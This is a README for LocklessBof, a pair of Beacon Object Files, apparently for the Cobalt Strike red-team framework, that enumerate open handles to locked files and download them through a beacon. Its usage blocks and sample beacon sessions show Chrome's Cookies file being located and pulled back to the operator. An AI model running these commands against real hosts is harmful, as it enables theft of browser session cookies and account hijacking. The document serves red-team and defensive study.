# LocklessBof
A Beacon Object File (BOF) implementation of [Lockless](https://github.com/GhostPack/Lockless) by [HarmJ0y](https://github.com/HarmJ0y), designed to enumerate open file handles and facilitate the fileless download of locked files. Within this project, you'll find two BOFs: LocklessEnum and LocklessDownload.

## LocklessEnum
LocklessEnum can be used to enumerate open file handles to a locked file. Upon detecting an open file handle, LocklessEnum supplies the user with information including the associated Process ID (PID) and the handle ID, which can then be supplied as input to LocklessDownload to download the locked file. 
### LocklessEnum Usage
```
Usage: lockless-enum <filename> <processname>
Example: 
   lockless-enum Cookies 
   lockless-enum Cookies Chrome
lockless- Enum Options: 
    <filename> -    (Required): The locked file's name.
    <processname> - (Optional): Narrow handle enumeration to the specified process. A partial name match is allowed (e.g., 'chro' for 'chrome')
```
## LocklessDownload
LocklessDownload can be used to download locked files. LocklessDownload requires the Process ID of the target process containing the open file handle, along with either the handle ID of the open file handle for the target file, or the filename to be downloaded. 
### LocklessDownload Usage
```
Usage: lockless-download <pid> <key> <value>
Example: 
   lockless-download 789 filename Cookies 
   lockless-download 789 handle_id 696
lockless-download Options: 
    <pid> -     (Required): Process ID (PID) of the target application, queried for handles to desired locked file
    <key> -     (Required): This can either be 'filename' or 'handle_id'
    <value> -   (Required): If 'filename' is chosen, provide the full name of the file to be downloaded. The filename is case sensitive
                            If 'handle_id' is chosen, provide the handle ID to the locked file to be downloaded
```
## Example
Find out which process has a handle to the locked "Cookies" file and retrieve the handles id:
```
beacon> lockless-enum Cookies
[+] host called home, sent: 6088 bytes
[+] received output:
Attempting to enumerate handle to file Cookies from  processes
[+] received output:
Process ID 2940 [Handle ID 1092] - Cookies [\Device\HarddiskVolume3\Users\defaultuser\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies]
```
Download the locked "Cookies" file using the identified pid and handle id
```
beacon> lockless-download 2940 handle_id 1092
[+] host called home, sent: 8796 bytes
[+] received output:
Attempting file download using handle_id 1092 from Process ID 2940
[+] received output:
Found file handle!
[+] received output:
File size is 524288

[*] started download of Cookies (524288 bytes)
[*] download of Cookies is complete
[+] received output:
Downloaded file Cookies from process ID: 2940
```
Download the locked "Cookies" file using the file name
```
beacon> lockless-download 2940 filename Cookies
[+] host called home, sent: 8810 bytes
[+] received output:
Attempting file download of filename Cookies from Process ID 2940
[+] received output:
Found file handle!
[+] received output:
File size is 524288

[*] started download of Cookies (524288 bytes)
[*] download of Cookies is complete
[+] received output:
Downloaded file Cookies from process ID: 2940
```
## References
[ProcessListHandles](https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main/Remote/ProcessListHandles) by [TrustedSec](https://github.com/trustedsec)  
[Lockless](https://github.com/GhostPack/Lockless) by [HarmJ0y](https://github.com/HarmJ0y)  
[Fileless download](https://github.com/fortra/nanodump) by [Fortra](https://github.com/fortra)  
